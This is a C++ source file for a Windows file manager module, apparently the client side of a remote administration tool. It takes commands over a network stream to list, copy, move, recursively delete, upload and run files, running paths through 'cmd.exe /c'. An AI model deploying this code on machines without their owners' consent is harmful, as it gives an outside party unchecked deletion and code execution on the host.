#include "FileManager.h"


std::string convertBytesToHumanSize(std::uintmax_t bytesSizeOfFile){
    if (bytesSizeOfFile>1024){
        std::uintmax_t op = bytesSizeOfFile / 1024;
        return static_cast<std::stringstream>(std::stringstream() << op).str().append(" KB");
    }
    return static_cast<std::stringstream>(std::stringstream() << bytesSizeOfFile).str().append(" Bytes");
}


std::string FileManager::readDirectory(const std::filesystem::path &directory, bool folder, bool file) {
    std::string paths;
    try {
        for (const auto &entry: std::filesystem::directory_iterator(directory)) {
            if (std::filesystem::is_directory(entry) && folder) {
                paths.append(entry.path().filename().string()).append("|");
            } else if (std::filesystem::is_regular_file(entry) && file) {
                paths.append(entry.path().filename().string().append("|"));
                std::uintmax_t fileSize = std::filesystem::file_size(entry);
                paths.append(convertBytesToHumanSize(fileSize)+"|");
            }
        }
    } catch (const std::filesystem::__cxx11::filesystem_error &) {
        paths.append("ACCESS_DENIED|");
    }
    if (folder) paths.append("/|");

    return paths;
}

void FileManager::send() {
    std::string result = readAll();
    stream.sendString(result.c_str());
}

std::string FileManager::readAll(){
    std::string path = stream.readString();
    std::string folderString = FileManager::readDirectory(std::filesystem::u8path(path), true, false);
    std::string fileString = FileManager::readDirectory(std::filesystem::u8path(path), false, true);
    folderString.append(fileString);
    return folderString;
}


void FileManager::copyFiles() {
    std::vector<std::string> vectorOfFiles = stream.readList();
    std::vector<std::string> vectorOfDirectories = stream.readList();
    for (const auto &directory: vectorOfDirectories) {
        for (const auto &file: vectorOfFiles) {
            std::filesystem::path pathI = std::filesystem::u8path(file);
            std::filesystem::path pathF = std::filesystem::u8path(directory);
            pathF /= pathI.filename();
            if (!std::filesystem::exists(pathF)) {
                std::filesystem::copy(pathI, pathF, std::filesystem::copy_options::overwrite_existing |
                                                    std::filesystem::copy_options::recursive);
            }
        }
    }
}

void FileManager::moveFiles() {
    std::vector<std::string> vectorOfFiles = stream.readList();
    std::string directory = stream.readString();
    for (const auto &file: vectorOfFiles) {
        std::filesystem::path pathI = std::filesystem::u8path(file);
        std::filesystem::path pathF = std::filesystem::u8path(directory);
        pathF /= pathI.filename();
        if (!std::filesystem::exists(pathF)) {
            std::filesystem::rename(pathI, pathF);
        }
    }
}

void FileManager::deleteFiles() {
    std::vector<std::string> vectorOfFiles = stream.readList();
    for (const auto &file: vectorOfFiles) {
        std::filesystem::remove_all(std::filesystem::u8path(file));
    }
}

void FileManager::runFiles() {
    std::vector<std::string> vectorOfFiles = stream.readList();
    for (const auto &file: vectorOfFiles) {
        STARTUPINFOW process_startup_info{};
        process_startup_info.cb = sizeof(process_startup_info);
        PROCESS_INFORMATION process_info{};

        std::wstring convertedString = Converter::string2wstring(file); // converting string to wstring
        std::wstring commandLine;
        if (std::filesystem::is_directory(convertedString)) {
            commandLine.append(L"explorer.exe ");
        } else {
            commandLine.append(L"cmd.exe /c ");
        }
        commandLine.append(L"\"").append(convertedString).append(L"\"");
        if (CreateProcessW(nullptr, (LPWSTR) commandLine.data(), nullptr, nullptr, TRUE, 0, nullptr, nullptr,
                           &process_startup_info, &process_info)) {
            WaitForSingleObject(process_info.hProcess, INFINITE);
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
        }
    }
}

void FileManager::uploadFiles(){
    std::string destinationPath = stream.readString();
    int numOfFiles = stream.readSize();
    for (int i = 0; i < numOfFiles; i++) {
        stream.readFile(destinationPath);
    }
}


FileManager::FileManager(const Stream &stream) : Sender(stream) {}










